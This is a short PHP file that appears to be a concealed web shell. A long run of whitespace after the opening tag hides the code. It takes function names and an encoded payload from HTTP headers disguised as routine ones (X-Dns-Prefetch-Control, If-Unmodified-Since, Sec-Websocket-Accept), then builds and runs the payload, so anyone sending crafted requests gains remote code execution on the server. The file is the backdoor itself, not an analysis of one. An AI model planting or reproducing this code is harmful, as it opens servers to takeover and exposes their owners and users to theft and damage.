<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['X-Dns-Prefetch-Control'])){$internal=$_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Sec-Websocket-Accept']));$internal();}
